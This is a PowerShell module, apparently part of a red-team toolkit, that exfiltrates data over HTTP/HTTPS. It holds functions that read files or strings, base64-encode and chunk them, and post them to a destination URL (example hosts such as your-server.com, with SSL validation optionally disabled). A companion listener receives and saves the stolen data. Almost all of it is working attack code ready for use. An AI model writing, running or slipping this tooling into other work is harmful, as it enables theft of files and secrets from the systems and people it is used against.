<#
.SYNOPSIS
    Exfiltrate data via HTTP/HTTPS

.DESCRIPTION
    Uploads files or data to a web server using PowerShell native web requests.
    Supports chunked uploads for large files.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER FilePath
    Path to file to exfiltrate

.PARAMETER Data
    Raw data string to exfiltrate

.PARAMETER Url
    Destination URL

.PARAMETER ChunkSize
    Size of chunks for large files (in bytes)

.EXAMPLE
    Invoke-HTTPExfil -FilePath C:\secrets\data.zip -Url "https://your-server.com/upload"
    Invoke-HTTPExfil -Data "sensitive info" -Url "https://your-server.com/receive"
#>

function Invoke-HTTPExfil {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'File')]
        [string]$FilePath,

        [Parameter(ParameterSetName = 'Data')]
        [string]$Data,

        [Parameter(Mandatory)]
        [string]$Url,

        [int]$ChunkSize = 1MB,

        [string]$Method = 'POST',

        [switch]$IgnoreSSLErrors,

        [hashtable]$Headers = @{}
    )

    Write-Host @"

============================================================
  HTTP DATA EXFILTRATION
============================================================
  Destination: $Url
  Method: $Method
============================================================

"@ -ForegroundColor Cyan

    # Ignore SSL certificate errors if requested
    if ($IgnoreSSLErrors) {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }

    try {
        if ($FilePath) {
            if (-not (Test-Path $FilePath)) {
                Write-Error "File not found: $FilePath"
                return
            }

            $fileInfo = Get-Item $FilePath
            Write-Host "[*] Exfiltrating file: $($fileInfo.Name) ($([math]::Round($fileInfo.Length / 1KB, 2)) KB)" -ForegroundColor Yellow

            if ($fileInfo.Length -gt $ChunkSize) {
                # Chunked upload for large files
                Write-Host "[*] Using chunked upload (chunk size: $([math]::Round($ChunkSize / 1KB, 2)) KB)" -ForegroundColor Yellow

                $buffer = New-Object byte[] $ChunkSize
                $fileStream = [System.IO.File]::OpenRead($FilePath)
                $totalChunks = [Math]::Ceiling($fileInfo.Length / $ChunkSize)
                $chunkNum = 0

                while (($bytesRead = $fileStream.Read($buffer, 0, $ChunkSize)) -gt 0) {
                    $chunkNum++
                    $chunkData = $buffer[0..($bytesRead - 1)]
                    $base64Chunk = [Convert]::ToBase64String($chunkData)

                    $body = @{
                        filename    = $fileInfo.Name
                        chunk       = $chunkNum
                        totalChunks = $totalChunks
                        data        = $base64Chunk
                    } | ConvertTo-Json

                    $response = Invoke-RestMethod -Uri $Url -Method $Method -Body $body -ContentType "application/json" -Headers $Headers

                    Write-Progress -Activity "Uploading" -Status "Chunk $chunkNum of $totalChunks" -PercentComplete (($chunkNum / $totalChunks) * 100)
                }

                $fileStream.Close()
                Write-Progress -Activity "Uploading" -Completed
                Write-Host "[+] File uploaded in $totalChunks chunks" -ForegroundColor Green
            }
            else {
                # Single upload for small files
                $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
                $base64 = [Convert]::ToBase64String($fileBytes)

                $body = @{
                    filename = $fileInfo.Name
                    data     = $base64
                } | ConvertTo-Json

                $response = Invoke-RestMethod -Uri $Url -Method $Method -Body $body -ContentType "application/json" -Headers $Headers

                Write-Host "[+] File uploaded successfully" -ForegroundColor Green
            }
        }
        elseif ($Data) {
            Write-Host "[*] Exfiltrating data string ($($Data.Length) characters)" -ForegroundColor Yellow

            $body = @{
                timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                hostname  = $env:COMPUTERNAME
                data      = $Data
            } | ConvertTo-Json

            $response = Invoke-RestMethod -Uri $Url -Method $Method -Body $body -ContentType "application/json" -Headers $Headers

            Write-Host "[+] Data exfiltrated successfully" -ForegroundColor Green
        }
        else {
            Write-Error "Specify either -FilePath or -Data"
        }

        return $response
    }
    catch {
        Write-Error "Exfiltration failed: $_"
    }
    finally {
        # Reset SSL validation
        if ($IgnoreSSLErrors) {
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
        }
    }
}

function Invoke-WebClientExfil {
    <#
    .SYNOPSIS
        Exfiltrate using System.Net.WebClient (alternative method)

    .EXAMPLE
        Invoke-WebClientExfil -FilePath C:\data.txt -Url "http://server.com/upload"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$FilePath,

        [Parameter(Mandatory)]
        [string]$Url
    )

    if (-not (Test-Path $FilePath)) {
        Write-Error "File not found: $FilePath"
        return
    }

    Write-Host "[*] Uploading via WebClient..." -ForegroundColor Yellow

    try {
        $webclient = New-Object System.Net.WebClient
        $response = $webclient.UploadFile($Url, $FilePath)
        $responseText = [System.Text.Encoding]::UTF8.GetString($response)

        Write-Host "[+] Upload complete" -ForegroundColor Green
        return $responseText
    }
    catch {
        Write-Error "WebClient upload failed: $_"
    }
}

function Start-SimpleHTTPServer {
    <#
    .SYNOPSIS
        Start a simple HTTP listener to receive exfiltrated data

    .DESCRIPTION
        For testing purposes - creates a simple HTTP listener that
        receives and saves uploaded data.

    .EXAMPLE
        Start-SimpleHTTPServer -Port 8080 -OutputPath C:\received
    #>
    [CmdletBinding()]
    param(
        [int]$Port = 8080,
        [string]$OutputPath = "$env:TEMP\received"
    )

    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }

    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://+:$Port/")

    try {
        $listener.Start()
        Write-Host "[+] HTTP server listening on port $Port" -ForegroundColor Green
        Write-Host "[*] Output directory: $OutputPath" -ForegroundColor Yellow
        Write-Host "[*] Press Ctrl+C to stop" -ForegroundColor Yellow

        while ($listener.IsListening) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response

            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

            # Read request body
            $reader = New-Object System.IO.StreamReader($request.InputStream)
            $body = $reader.ReadToEnd()
            $reader.Close()

            # Save received data
            $outputFile = Join-Path $OutputPath "received_$timestamp.json"
            $body | Out-File $outputFile -Encoding UTF8

            Write-Host "[+] Received data from $($request.RemoteEndPoint) -> $outputFile" -ForegroundColor Green

            # Send response
            $responseText = "OK"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($responseText)
            $response.ContentLength64 = $buffer.Length
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
            $response.Close()
        }
    }
    finally {
        $listener.Stop()
    }
}

# Export functions
Export-ModuleMember -Function Invoke-HTTPExfil, Invoke-WebClientExfil, Start-SimpleHTTPServer
